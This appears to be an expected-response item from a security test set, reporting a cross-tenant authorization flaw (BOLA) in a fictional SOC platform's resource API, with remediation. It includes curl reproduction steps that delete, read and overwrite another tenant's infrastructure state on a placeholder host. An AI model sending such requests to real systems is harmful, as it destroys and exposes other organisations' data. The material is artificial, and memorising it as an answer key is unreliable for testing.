# Expected Response

## System
- System: ThreatLens SOC Platform v1.9.0
- Domain: CYBERSECURITY / SIEM
- Example ID: BOLA-0083
- Risk ID: RISK-44-083

## Findings

### 1. Pattern 4.4 — IaC State File Exposure + Cross-Tenant DELETE on `/api/v1/resources/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v1/resources/:id` endpoint queries by `resource_id` only, without filtering by `owner_id` or `tenant_id`. In the Cybersecurity/SIEM domain, `/api/v1/resources` represents SOC platform resources that may contain IaC state files (Terraform state, CloudFormation templates, Ansible playbooks) with sensitive infrastructure secrets, network topology, and security configurations.

Pattern 4.4 "IaC state file exposure": An attacker can:
1. **DELETE** another tenant's SOC resources — destroying their IaC state files and potentially causing infrastructure desync or SIEM blind spots (HAR primary).
2. **Read** another tenant's IaC state file contents including embedded secrets, resource ARNs, and network configuration.
3. **PATCH** another tenant's resource data to inject malicious configuration or corrupt security baselines.

**Evidence from HAR:**
- Request: `DELETE /api/v1/resources/RES-2083` from `ORG-CC59`
- Response `tenantId: "ORG-DD58"` — cross-tenant resource deletion confirmed
- Response HTTP status: 200 — no authorization failure
- Response returns the deleted resource's `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-DD58"`

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.threatlens-soc-.example.com/api/v1/resources/RES-1083" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-CC59>" \
  -H "X-Tenant-ID: ORG-CC59"
```
**Expected:** Returns own record with `tenantId: "ORG-CC59"`.

**Step 2 — Cross-tenant SOC resource DELETE: destroy another tenant's IaC state file (primary HAR attack):**
```bash
curl -s -X DELETE "https://api.threatlens-soc-.example.com/api/v1/resources/RES-2083" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-CC59>" \
  -H "X-Tenant-ID: ORG-CC59"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-DD58"` and deleted resource's `sensitiveData` — another tenant's IaC state destroyed (SIEM infrastructure sabotage).

**Step 3 — Cross-tenant IaC state file read (expose secrets and network topology):**
```bash
curl -s "https://api.threatlens-soc-.example.com/api/v1/resources/RES-2083" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-CC59>" \
  -H "X-Tenant-ID: ORG-CC59"
```
**Vulnerable outcome:** Returns `sensitiveData` containing IaC state including embedded API keys, ARNs, network CIDR blocks — full infrastructure intelligence for ORG-DD58.

**Step 4 — Cross-tenant IaC state PATCH: inject malicious configuration baseline:**
```bash
curl -s -X PATCH "https://api.threatlens-soc-.example.com/api/v1/resources/RES-2083" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-CC59>" \
  -H "X-Tenant-ID: ORG-CC59" \
  -H "Content-Type: application/json" \
  -d '{"status": "compromised", "sensitive_data": "iac_state_backdoored_by_attacker"}'
```
**Vulnerable outcome:** IaC state file corrupted — next infrastructure apply from `ORG-DD58` deploys attacker-controlled configuration.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE resource_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all resource queries (RISK-44-083).
- Centralize authorization middleware: never resolve resource IDs without ownership check.
- Encrypt IaC state files at rest; do not store raw secrets in `sensitive_data` fields.
- Use non-sequential UUIDs for resource IDs to reduce enumeration risk.
- Add regression test: Tenant A token requests Tenant B resource ID — assert 403/404.
